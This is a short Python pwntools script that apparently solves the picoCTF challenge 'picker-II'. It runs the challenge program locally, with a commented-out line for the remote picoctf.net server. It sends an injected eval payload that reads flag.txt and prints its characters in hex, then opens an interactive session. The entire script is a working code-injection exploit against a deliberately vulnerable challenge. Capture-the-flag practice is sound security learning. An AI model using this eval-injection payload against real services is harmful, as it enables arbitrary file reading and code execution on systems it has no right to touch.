from pwn import *

# Use process to run the local script
conn = process(['python3', 'picker-II.py'])
#conn = remote('saturn.picoctf.net', 54697)

# Payload to mimic the actions of the "win" function
# reading all letter one by one in flag txt and  printing then in hex
p = "eval(\"print(' '.join([hex(ord(c)) for c in open('flag.txt', 'r').read()]))\")"

conn.sendline(p)

# Switch to interactive mode
conn.interactive()
